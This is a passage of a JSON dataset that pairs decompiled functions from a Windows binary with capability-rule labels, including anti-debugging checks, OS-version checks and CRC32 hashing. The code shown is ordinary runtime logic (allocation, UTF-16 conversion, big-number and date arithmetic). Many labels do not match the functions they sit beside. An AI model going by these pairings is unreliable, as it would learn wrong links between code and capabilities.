        "decompiled_code": "\nvoid fcn.14001d0d0(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    fcn.14001cd80(0);\n    if (*0x140136c88 == NULL) {\n        if ((*0x140106510 + -0x28026c70 >> 3) + 5U < 0x121) {\n            puVar3 = *0x140106510;\n            *0x140106510 = *0x140106510 + 5;\n        }\n        else {\n            puVar3 = sub.msvcrt.dll_malloc(0x28);\n            if (puVar3 == NULL) {\n                return;\n            }\n        }\n        iVar1 = *0x140136cd0;\n        puVar3[1] = *0x14010fc28;\n    }\n    else {\n        puVar3 = *0x140136c88;\n        *0x140136c88 = **0x140136c88;\n        iVar1 = *0x140136cd0;\n    }\n    if (iVar1 == 2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140136ce0);\n    }\n    uVar2 = *0x14010fc30;\n    *(puVar3 + 3) = arg1;\n    puVar3[2] = uVar2;\n    return;\n}\n",
        "token_count": 312
    },
    "14001d2f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.14001d2f0(int64_t arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong *arg2_00;\n    \n    if (((arg2 & 3) == 0) || (arg1 = fcn.14001d010(arg1, *(((arg2 & 3) - 1) * 4 + 0x14010fae0), 0),  arg1 != 0)) {\n        arg2._0_4_ = arg2 >> 2;\n        if (arg2 != 0) {\n            puVar3 = *0x140136360;\n            if (*0x140136360 == NULL) {\n                fcn.14001cd80(1);\n                puVar3 = *0x140136360;\n                if (*0x140136360 == NULL) {\n                    puVar3 = fcn.14001ceb0(1);\n                    if (puVar3 == NULL) {\n                        *0x140136360 = NULL;\n                        return 0;\n                    }\n                    *0x140136360 = puVar3;\n                    *(puVar3 + 0x14) = 0x27100000001;\n                    *puVar3 = 0;\n                }\n                if (*0x140136cd0 == 2) {\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140136d08);\n                }\n            }\n            while( true ) {\n                arg2_00 = puVar3;\n                uVar1 = arg2 & 1;\n                arg2._0_4_ = arg2 >> 1;\n                if (uVar1 != 0) {\n                    iVar2 = fcn.14001d190(arg1, arg2_00);\n                    if (iVar2 == 0) goto code_r0x00014001d3e3;\n                    fcn.14001cfa0(arg1);\n                    arg1 = iVar2;\n                }\n                if (arg2 == 0) break;\n                puVar3 = *arg2_00;\n                if (*arg2_00 == NULL) {\n                    fcn.14001cd80(1);\n                    puVar3 = *arg2_00;\n                    if (puVar3 == NULL) {\n                        puVar3 = fcn.14001d190(arg2_00, arg2_00);\n                        *arg2_00 = puVar3;\n                        if (puVar3 == NULL) goto code_r0x00014001d3e3;\n                        *puVar3 = 0;\n                    }\n                    if (*0x140136cd0 == 2) {\n                        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x140136d08);\n                    }\n                }\n            }\n        }\n    }\n    else {\ncode_r0x00014001d3e3:\n        arg1 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 646
    },
    "14001f43": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.14001f430(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    uint64_t arg1_00;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong auStackX24 [2];\n    ulong uStack48;\n    \n    puVar5 = ~arg4 + *(arg1 + 0x18);\n    auStackX24[0] = arg3;\n    do {\n        uVar7 = 0;\n        uVar3 = 0;\n        do {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar2 = uVar3 & 0x3f;\n            uVar3 = uVar3 + 7;\n            uVar7 = uVar7 | (uVar1 & 0x7f) << uVar2;\n        } while (uVar1 < '\\0');\n        if (uVar7 == 0) {\n            return 0;\n        }\n        uVar3 = *(arg1 + 0x28);\n        arg1_00 = uVar3;\n        if (uVar3 == 0xff) {\n            iVar6 = 0;\n        }\n        else {\n            uVar3 = uVar3 & 7;\n            if (uVar3 == 2) {\ncode_r0x00014001f510:\n                iVar6 = uVar7 * -2;\n            }\n            else {\n                if (uVar3 < 3) {\n                    if (uVar3 != 0) {\ncode_r0x00014001f504:\n                        sub.msvcrt.dll_abort();\n                        goto code_r0x00014001f510;\n                    }\n                }\n                else {\n                    iVar6 = uVar7 * -4;\n                    if (uVar3 == 3) goto code_r0x00014001f4b4;\n                    if (uVar3 != 4) goto code_r0x00014001f504;\n                }\n                iVar6 = uVar7 * -8;\n            }\n        }\ncode_r0x00014001f4b4:\n        fcn.14001f5f0(arg1_00, *(arg1 + 0x10), iVar6 + *(arg1 + 0x18), &uStack48);\n        uVar4 = fcn.14001f2e0(uStack48, arg2, auStackX24);\n        if (uVar4 != '\\0') {\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 597
    },
    "140081b8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.140081b80(int16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    int16_t *piVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint16_t uVar8;\n    int16_t *piVar9;\n    int32_t in_stack_00000028;\n    \n    piVar1 = arg1[1];\n    piVar9 = *arg1;\n    if (((((arg4 & 4) != 0) && (2 < piVar1 - piVar9)) && (*piVar9 == -0x4411)) && (*(piVar9 + 1) == -0x41)) {\n        piVar9 = piVar9 + 3;\n        *arg1 = piVar9;\n    }\n    if (piVar9 != piVar1) {\n        puVar2 = arg2[1];\n        do {\n            while( true ) {\n                puVar3 = *arg2;\n                if (puVar3 == puVar2) {\n                    return 0;\n                }\n                uVar7 = fcn.140081620(arg1, arg3);\n                uVar6 = uVar7;\n                if (uVar6 == 0xfffffffe) {\n                    return in_stack_00000028 + 1;\n                }\n                if (arg3 < uVar6) {\n                    return 2;\n                }\n                uVar4 = uVar7;\n                if (uVar6 < 0x10000) break;\n                if (puVar2 - puVar3 < 3) {\n                    *arg1 = piVar9;\n                    arg1[1] = piVar1;\n                    return 1;\n                }\n                uVar5 = (uVar4 & 0x3ff) + 0xdc00;\n                uVar8 = ((uVar7 & 0xffffffff) >> 10) + 0xd7c0;\n                if ((arg4 & 1) == 0) {\n                    uVar8 = uVar8 * 0x100 | uVar8 >> 8;\n                    uVar5 = (uVar4 & 0x3ff) << 8 | uVar5 >> 8;\n                }\n                piVar9 = *arg1;\n                *puVar3 = uVar8;\n                *arg2 = puVar3 + 2;\n                puVar3[1] = uVar5;\n                if (piVar9 == piVar1) {\n                    return 0;\n                }\n            }\n            piVar9 = *arg1;\n            if ((arg4 & 1) == 0) {\n                uVar4 = uVar4 << 8 | uVar4 >> 8;\n            }\n            *arg2 = puVar3 + 1;\n            *puVar3 = uVar4;\n        } while (piVar9 != piVar1);\n    }\n    return 0;\n}\n",
        "token_count": 676
    },
    "140081d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint16_t * fcn.140081d00(int16_t *arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int16_t **arg1_00;\n    int64_t iVar3;\n    bool bVar4;\n    uint8_t in_stack_00000028;\n    int16_t *piStack40;\n    int64_t iStack32;\n    \n    piStack40 = arg1;\n    if (((((in_stack_00000028 & 4) != 0) && (2 < arg2 - arg1)) && (*arg1 == -0x4411)) && (*(arg1 + 1) == -0x41)) {\n        piStack40 = arg1 + 3;\n    }\n    iVar3 = arg3 + -1;\n    uVar1 = 0xffff;\n    if (arg4 < 0x10000) {\n        uVar1 = arg4;\n    }\n    if (arg3 != 0) {\n        arg1_00 = &piStack40;\n        iStack32 = arg2;\n        do {\n            uVar2 = fcn.140081620(arg1_00, uVar1);\n            bVar4 = iVar3 != 0;\n            iVar3 = iVar3 + -1;\n        } while (uVar2 <= uVar1 && bVar4);\n    }\n    return piStack40;\n}\n",
        "token_count": 319
    },
    "1400b319": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1400b3190(void)\n\n{\n    int32_t iVar1;\n    \n    if (**0x14010fc90 == 0) {\n        iVar1 = **0x140110170;\n        **0x140110170 = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        iVar1 = **0x140110170;\n        **0x140110170 = **0x140110170 + -1;\n    }\n    if (iVar1 != 2) {\n        return;\n    }\n    fcn.140079860(*0x140110290);\n    fcn.140079860(*0x140110270);\n    fcn.140079860(*0x140110280);\n    fcn.140093c60(*0x1401102d0);\n    fcn.140093c60(*0x1401102b0);\n    fcn.140093c60(*0x1401102c0);\n    return;\n}\n",
        "token_count": 211
    },
    "1400b782": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.1400b7820(int64_t *arg1, int64_t *arg2, uchar *arg3)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    int64_t iVar4;\n    int16_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    piVar1 = arg1[2];\n    *arg3 = 1;\n    if (piVar1 < arg1[3]) {\n        iVar3 = *piVar1;\n    }\n    else {\n        iVar3 = (**(*arg1 + 0x48))();\n    }\n    iVar6 = 0;\n    do {\n        while( true ) {\n            if (iVar3 == -1) {\n                return iVar6;\n            }\n            piVar1 = arg1[3];\n            piVar5 = arg1[2];\n            iVar7 = piVar1 - piVar5;\n            if (iVar7 < 3) break;\n            iVar7 = iVar7 >> 1;\n            iVar4 = (**(*arg2 + 0x60))(arg2, piVar5, iVar7);\n            iVar6 = iVar6 + iVar4;\n            arg1[2] = arg1[2] + iVar4 * 2;\n            if (iVar4 < iVar7) {\ncode_r0x0001400b78e0:\n                *arg3 = 0;\n                return iVar6;\n            }\ncode_r0x0001400b787b:\n            iVar3 = (**(*arg1 + 0x48))(arg1);\n        }\n        piVar2 = arg2[5];\n        if (piVar2 < arg2[6]) {\n            *piVar2 = iVar3;\n            arg2[5] = piVar2 + 1;\n            if (piVar5 < piVar1) goto code_r0x0001400b78c0;\ncode_r0x0001400b7920:\n            iVar3 = (**(*arg1 + 0x50))(arg1);\n        }\n        else {\n            iVar3 = (**(*arg2 + 0x68))(arg2, iVar3);\n            if (iVar3 == -1) goto code_r0x0001400b78e0;\n            piVar5 = arg1[2];\n            if (arg1[3] <= piVar5) goto code_r0x0001400b7920;\ncode_r0x0001400b78c0:\n            iVar3 = *piVar5;\n            arg1[2] = piVar5 + 1;\n        }\n        iVar6 = iVar6 + 1;\n        if (iVar3 == -1) {\n            return iVar6;\n        }\n        if (arg1[3] <= arg1[2]) goto code_r0x0001400b787b;\n        iVar3 = *arg1[2];\n    } while( true );\n}\n",
        "token_count": 643
    },
    "14001832": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.140018320(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int64_t iVar3;\n    uint8_t *puVar4;\n    uint8_t auStack12 [12];\n    \n    uVar1 = *(arg3 + 8);\n    *(arg3 + 0x10) = 0xffffffff;\n    if (arg1 == 0) {\n        uVar2 = 0x2b;\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar4 = auStack12;\n            }\n            else {\n                puVar4 = auStack12 + 1;\n                auStack12[0] = 0x20;\n            }\n            goto code_r0x00014001835b;\n        }\n    }\n    else {\n        uVar2 = 0x2d;\n    }\n    puVar4 = auStack12 + 1;\n    auStack12[0] = uVar2;\ncode_r0x00014001835b:\n    iVar3 = 0;\n    do {\n        puVar4[iVar3] = *(arg2 + iVar3) & 0xdf | uVar1 & 0x20;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 3);\n    fcn.140018180(auStack12, (puVar4 + 3) - auStack12, arg3);\n    return;\n}\n",
        "token_count": 349
    },
    "14001a56": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.14001a560(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    uint32_t *puVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uint64_t uVar15;\n    \n    if (*(arg1 + 0x14) < *(arg2 + 0x14)) {\n        return 0;\n    }\n    iVar12 = *(arg2 + 0x14) + -1;\n    puVar8 = arg2 + 0x18;\n    puVar1 = arg1 + 0x18;\n    puVar2 = puVar8 + iVar12;\n    puVar10 = puVar1 + iVar12;\n    uVar11 = *puVar10 / (*puVar2 + 1);\n    iVar5 = uVar11;\n    if (*puVar2 + 1 <= *puVar10) {\n        uVar15 = 0;\n        uVar9 = 0;\n        puVar13 = puVar1;\n        puVar14 = puVar8;\n        do {\n            uVar3 = *puVar14;\n            puVar14 = puVar14 + 1;\n            uVar6 = uVar3 * uVar11 + uVar15;\n            uVar15 = uVar6 >> 0x20;\n            iVar7 = (*puVar13 - (uVar6 & 0xffffffff)) - uVar9;\n            *puVar13 = iVar7;\n            uVar9 = iVar7 >> 0x20 & 1;\n            puVar13 = puVar13 + 1;\n        } while (puVar14 <= puVar2);\n        if (*puVar10 == 0) {\n            while ((puVar10 = puVar10 + -1,  puVar1 < puVar10 && (*puVar10 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            *(arg1 + 0x14) = iVar12;\n            iVar4 = fcn.14001d580(arg1, arg2);\n            goto joined_r0x00014001a623;\n        }\n    }\n    iVar4 = fcn.14001d580(arg1, arg2);\njoined_r0x00014001a623:\n    if (-1 < iVar4) {\n        uVar11 = 0;\n        puVar10 = puVar1;\n        do {\n            uVar3 = *puVar8;\n            puVar8 = puVar8 + 1;\n            iVar7 = (*puVar10 - uVar3) - uVar11;\n            *puVar10 = iVar7;\n            uVar11 = iVar7 >> 0x20 & 1;\n            puVar10 = puVar10 + 1;\n        } while (puVar8 <= puVar2);\n        puVar8 = puVar1 + iVar12;\n        if (*puVar8 == 0) {\n            while ((puVar8 = puVar8 + -1,  puVar1 < puVar8 && (*puVar8 == 0))) {\n                iVar12 = iVar12 + -1;\n            }\n            iVar5 = iVar5 + 1;\n            *(arg1 + 0x14) = iVar12;\n        }\n        else {\n            iVar5 = iVar5 + 1;\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 810
    },
    "14001d5d": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t fcn.14001d5d0(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint32_t *puVar12;\n    uint64_t uVar13;\n    int32_t *piVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t *puVar17;\n    bool bVar18;\n    \n    iVar5 = *(arg2 + 0x14);\n    iVar15 = *(arg1 + 0x14) - iVar5;\n    bVar18 = iVar15 < 0;\n    iVar10 = arg2;\n    if (iVar15 == 0) {\n        puVar6 = arg1 + 0x18U + iVar5;\n        puVar12 = arg2 + 0x18 + iVar5 * 4;\n        do {\n            puVar6 = puVar6 + -1;\n            puVar12 = puVar12 + -1;\n            if (*puVar6 != *puVar12) {\n                if (*puVar6 < *puVar12) goto code_r0x00014001d753;\n                goto code_r0x00014001d630;\n            }\n        } while (arg1 + 0x18U < puVar6);\n        iVar7 = fcn.14001ceb0(0);\n        if (iVar7 != 0) {\n            *(iVar7 + 0x14) = 1;\n        }\n    }\n    else {\n        iVar15 = 0;\n        if (bVar18) {\ncode_r0x00014001d753:\n            iVar15 = 1;\n            iVar10 = arg1;\n            arg1 = arg2;\n        }\ncode_r0x00014001d630:\n        iVar7 = fcn.14001ceb0(*(arg1 + 8));\n        if (iVar7 != 0) {\n            *(iVar7 + 0x10) = iVar15;\n            uVar16 = *(arg1 + 0x14);\n            uVar8 = uVar16;\n            iVar11 = 0x18;\n            uVar13 = 0;\n            puVar6 = arg1 + 0x18 + uVar8 * 4;\n            uVar3 = iVar10 + 0x18 + *(iVar10 + 0x14) * 4;\n            do {\n                iVar9 = (*(arg1 + iVar11) - *(iVar10 + iVar11)) - uVar13;\n                iVar5 = iVar9;\n                *(iVar7 + iVar11) = iVar5;\n                iVar11 = iVar11 + 4;\n                uVar13 = iVar9 >> 0x20 & 1;\n            } while (iVar11 + iVar10 < uVar3);\n            uVar1 = (uVar3 - iVar10) - 0x19;\n            iVar11 = (uVar1 & 0xfffffffffffffffc) + 4;\n            if (uVar3 < iVar10 + 0x19U) {\n                iVar11 = 4;\n            }\n            puVar17 = arg1 + 0x18 + iVar11;\n            piVar2 = iVar7 + 0x18 + iVar11;\n            puVar12 = puVar17;\n            piVar14 = piVar2;\n            if (puVar17 < puVar6) {\n                do {\n                    uVar4 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    iVar5 = uVar4 - uVar13;\n                    *piVar14 = iVar5;\n                    uVar13 = uVar4 - uVar13 >> 0x20 & 1;\n                    piVar14 = piVar14 + 1;\n                } while (puVar12 < puVar6);\n                iVar10 = piVar2 + (puVar6 + (-1 - puVar17) & 0xfffffffffffffffcU);\n            }\n            else {\n                uVar13 = uVar1 & 0xfffffffffffffffc;\n                if (uVar3 < iVar10 + 0x19U) {\n                    uVar13 = 0;\n                }\n                iVar10 = iVar7 + 0x18 + uVar13;\n            }\n            while (iVar5 == 0) {\n                piVar2 = iVar10 + -4;\n                iVar10 = iVar10 + -4;\n                uVar16 = uVar8 - 1;\n                uVar8 = uVar16;\n                iVar5 = *piVar2;\n            }\n            *(iVar7 + 0x14) = uVar16;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 1071
    },
    "1400819f": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.1400819f0(uint16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t *puVar1;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint32_t auStackX32 [2];\n    \n    auStackX32[0] = arg4;\n    fcn.140081300(arg1, auStackX32);\n    puVar6 = *arg1;\n    puVar1 = arg1[1];\n    if (0xffff < arg3) {\n        arg3._0_4_ = 0xffff;\n    }\n    if (puVar1 - puVar6 >> 1 != 0) {\n        puVar2 = arg2[1];\n        puVar5 = *arg2;\n        do {\n            if (puVar5 == puVar2) {\n                return 1;\n            }\n            uVar4 = *puVar6;\n            if ((auStackX32[0] & 1) == 0) {\n                uVar4 = uVar4 << 8 | uVar4 >> 8;\n            }\n            uVar3 = uVar4;\n            if (((uVar3 - 0xd800 < 0x400) || (uVar3 - 0xdc00 < 0x400)) || (arg3 < uVar3)) {\n                return 2;\n            }\n            puVar6 = puVar6 + 1;\n            *arg1 = puVar6;\n            *arg2 = puVar5 + 1;\n            *puVar5 = uVar4;\n            puVar5 = puVar5 + 1;\n        } while (puVar1 - puVar6 >> 1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "140081ae": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool fcn.140081ae0(uint16_t **arg1, uint16_t **arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    uint16_t *puVar4;\n    \n    puVar4 = arg1[1];\n    puVar1 = *arg1;\n    if (puVar4 != puVar1) {\n        puVar3 = *arg2;\n        do {\n            if (arg2[1] - puVar3 >> 1 == 0) {\n                return puVar1 != puVar4;\n            }\n            uVar2 = *puVar1;\n            if ((uVar2 - 0xd800 < 0x400) || (arg3 < uVar2)) {\n                return 2;\n            }\n            if ((arg4 & 1) == 0) {\n                uVar2 = uVar2 << 8 | uVar2 >> 8;\n            }\n            *puVar3 = uVar2;\n            puVar4 = arg1[1];\n            puVar3 = *arg2 + 1;\n            puVar1 = *arg1;\n            *arg2 = puVar3;\n            puVar1 = puVar1 + 1;\n            *arg1 = puVar1;\n        } while (puVar1 != puVar4);\n    }\n    return false;\n}\n",
        "token_count": 312
    },
    "14009e54": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.14009e540(uint16_t *arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    \n    uVar8 = *arg1;\n    if ((uVar8 & 0x101) == 0x101) {\n        *(arg2 + 8) = *(arg2 + 8) + 0xc;\n    }\n    uVar1 = *arg1;\n    uVar9 = uVar1;\n    if (uVar1 < '\\0') {\n        iVar2 = 0;\n        if ((*(arg1 + 1) & 2) != 0) {\n            iVar2 = *(arg2 + 0x14) % 100;\n        }\n        *(arg2 + 0x14) = (*(arg1 + 2) + -0x13) * 100 + iVar2;\n    }\n    if ((uVar8 & 0x402) == 0x400) {\n        if (((uVar1 & 0x18) == 0x18) || ((uVar1 & 4) == 0)) {\n            uVar5 = *(arg2 + 0x10);\n            if ((uVar1 & 8) == 0) goto code_r0x00014009e91d;\n        }\n        else {\n            uVar3 = *(arg2 + 0x14) + 0x76c;\n            uVar10 = uVar3 % 100;\n            bVar11 = (uVar3 & 3) == 0;\n            iVar2 = 0;\n            while( true ) {\n                if ((uVar10 != 0) || (iVar6 = 0,  uVar3 % 400 == 0)) {\n                    iVar6 = bVar11;\n                }\n                if (*(arg2 + 0x1c) < *((iVar6 * 0xd + iVar2) * 2 + 0x140110bc0)) break;\n                iVar2 = iVar2 + 1;\n            }\n            if ((uVar1 & 8) == 0) {\n                uVar7 = iVar2 - 1;\n                *(arg2 + 0x10) = uVar7;\n            }\n            else {\n                uVar7 = *(arg2 + 0x10);\n            }\n            uVar5 = uVar7;\n            if ((uVar1 & 0x10) == 0) {\n                if ((uVar10 != 0) || (uVar3 % 400 == 0)) {\n                    uVar10 = bVar11;\n                }\n                *(arg2 + 0xc) = (*(arg2 + 0x1c) - *((uVar10 * 0xd + iVar2 + -1) * 2 + 0x140110bc0)) + 1;\n            }\n            uVar3 = *arg1 | 0x18;\n            uVar9 = uVar3;\n            *arg1 = uVar3;\n            uVar8 = *arg1;\n            if ((uVar3 & 8) == 0) {\ncode_r0x00014009e91d:\n                if (0xb < uVar5) goto code_r0x00014009e591;\n            }\n        }\n        uVar4 = fcn.140081350(*(arg2 + 0x14), uVar5);\n        *(arg2 + 0x18) = uVar4;\n    }\n    if ((uVar8 & 0x404) == 0x400) {\n        if (((uVar9 & 8) != 0) || (*(arg2 + 0x10) < 0xc)) {\n            uVar3 = *(arg2 + 0x14) + 0x76c;\n            uVar10 = uVar3 % 100;\n            if ((uVar10 != 0) || ((uVar3 * -0x3d70a3d7 + 0x51eb850 >> 4 | uVar3 * -0x70000000) < 0xa3d70b)) {\n                uVar10 = (uVar3 & 3) == 0;\n            }\n            *(arg2 + 0x1c) = *(arg2 + 0xc) + -1 + *((uVar10 * 0xd + *(arg2 + 0x10)) * 2 + 0x140110bc0);\n        }\n    }\ncode_r0x00014009e591:\n    if (((uVar9 & 0x60) != 0) && ((uVar9 & 2) != 0)) {\n        uVar3 = *(arg2 + 0x14);\n        if ((uVar9 & 4) == 0) {\n            iVar2 = fcn.140081350(uVar3, 0);\n            uVar10 = (uVar9 >> 5 ^ 1) & 1;\n            *(arg2 + 0x1c) =\n                 ((uVar10 - iVar2) + 7) % 7 + ((*(arg1 + 1) & 0x3f) - 1) * 7 + ((*(arg2 + 0x18) - uVar10) + 7) % 7;\n        }\n        if ((uVar9 & 0x18) != 0x18) {\n            uVar3 = uVar3 + 0x76c;\n            iVar2 = 0;\n            uVar10 = uVar3 % 100;\n            while( true ) {\n                if ((uVar10 != 0) || (uVar5 = 0,  uVar3 % 400 == 0)) {\n                    uVar5 = (uVar3 & 3) == 0;\n                }\n                if (*(arg2 + 0x1c) < *((uVar5 * 0xd + iVar2) * 2 + 0x140110bc0)) break;\n                iVar2 = iVar2 + 1;\n            }\n            if ((uVar9 & 8) == 0) {\n                *(arg2 + 0x10) = iVar2 + -1;\n            }\n            if ((uVar9 & 0x10) == 0) {\n                if ((uVar10 != 0) || (uVar3 % 400 == 0)) {\n                    uVar10 = (uVar3 & 3) == 0;\n                }\n                *(arg2 + 0xc) = (*(arg2 + 0x1c) - *((uVar10 * 0xd + iVar2 + -1) * 2 + 0x140110bc0)) + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1537
    },
    "140079da": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nchar * fcn.140079da0(uchar *arg1, char **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [24];\n    \n    pcVar3 = *arg2;\n    *(arg1 + 8) = arg2;\n    *arg1 = 0;\n    iVar2 = *(pcVar3 + -0x18) + arg2;\n    pcVar3 = *(iVar2 + 0xd8);\n    uVar4 = *(iVar2 + 0x20);\n    if (pcVar3 != NULL) {\n        if (uVar4 != 0) goto code_r0x000140079dd0;\n        fcn.140079860(pcVar3);\n        pcVar3 = *arg2;\n        iVar2 = arg2 + *(pcVar3 + -0x18);\n    }\n    uVar4 = *(iVar2 + 0x20);\n    if (uVar4 == 0) {\n        *arg1 = 1;\n        return pcVar3;\n    }\ncode_r0x000140079dd0:\n    if ((uVar4 & 1) == 0) {\n        return pcVar3;\n    }\n    uVar5 = uVar4 | 4;\n    if (*(iVar2 + 0xe8) == 0) {\n        uVar5 = uVar4 | 5;\n    }\n    *(iVar2 + 0x20) = uVar5;\n    uVar5 = uVar5 & *(iVar2 + 0x1c);\n    arg2_00 = uVar5;\n    if (uVar5 == 0) {\n        return pcVar3;\n    }\n    pcVar3 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    fcn.1400a59d0(pcVar3, arg2_00 + 0xd0);\n    fcn.1400b3230(auStack88, arg2_00, in_R8);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b47a0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.1400a59d0(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.1400a5b40(piVar1 + 7, in_R8);\n        fcn.1400a5ae0(auStack88);\n    }\n    return pcVar3;\n}\n",
        "token_count": 630
    },
    "1400941a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
